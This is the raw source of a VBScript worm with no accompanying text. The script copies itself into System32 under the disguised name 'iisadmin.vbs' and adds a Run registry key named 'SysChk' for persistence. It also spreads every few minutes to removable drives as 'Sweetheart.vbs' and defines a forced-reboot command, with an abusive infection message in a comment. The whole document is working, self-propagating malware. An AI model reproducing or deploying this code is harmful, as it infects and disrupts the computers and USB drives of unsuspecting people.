Set WShell = CreateObject("WScript.Shell")
startupRegKey = "HKEY_LOCAL_MACHINE\SOFtWARE\Microsoft\Windows\CurrentVersion\Run\SysChk"
set FileSysObj = CreateObject("Scripting.FilesystemObject")
Set sys32DirObj = FileSysObj.GetSpecialFolder(1)
command = "shutdown.exe -r -t 0" ' & Chr(34) & "You are infected, BITCH! You have 30 seconds to save your work." & Chr(34)
entryPoint

Sub entryPoint()
	sys32DirName = CStr(sys32DirObj)
	scriptFullName = wscript.scriptfullname
	if instr(scriptFullName,sys32DirName) then
		do
			getDrvs
			wscript.sleep 180000
		Loop
	Else
		if (FileSysObj.fileexists(sys32DirObj & "\iisadmin.vbs"))=false Then
			copyToFol sys32DirObj,"iisadmin"
			register sys32DirObj
		End If
	end if
	getDrvs
	if Not (FileSysObj.fileexists(sys32DirObj & "\iisadmin.vbs")) Then
		CopyToFol sys32DirObj,"iisadmin"
		register sys32DirObj
	end If
end sub

sub getDrvs()
	Dim FSObj, drv, dArray
	Set FSObj = CreateObject("Scripting.FileSystemObject")
	Set dArray = FSObj.Drives

	For Each drv in dArray
		vdrv = drv.Driveletter & ":"
		drvType= getRemovable(vdrv)
		if drvType ="Removable" and drv.isReady then
			if not (FSObj.fileexists(vdrv & "\Sweetheart.vbs")) then
				copyToFol vdrv,"Sweetheart"
			end If
		end if
	Next
End Sub

Function getRemovable(drvpath)
	Dim FSObj, AbsDrvName, t
	Set FSObj = CreateObject("Scripting.FileSystemObject")
	Set AbsDrvName = FSObj.GetDrive(FSObj.GetDriveName(FSObj.GetAbsolutePathName(drvpath)))
	Select Case AbsDrvName.DriveType
		Case 0: t = "Unknown"
		Case 1: t = "Removable"
		Case 2: t = "Fixed"
		Case 3: t = "Remote"
		Case 4: t = "CD-ROM"
		Case 5: t = "RAM Disk"
	End Select
	getRemovable = t
End Function

Sub register(system32)
	set WShell = CreateObject("WScript.Shell")
	if (FileSysObj.fileexists(system32 & "\iisadmin.vbs")) Then
		WShell.regwrite startupRegKey, system32 & "\iisadmin.vbs"
	End If
end Sub

Sub copyToFol(x,name)
	file = Wscript.ScriptFullName
	FileSysObj.copyfile file, x & "\" & name & ".vbs"
end sub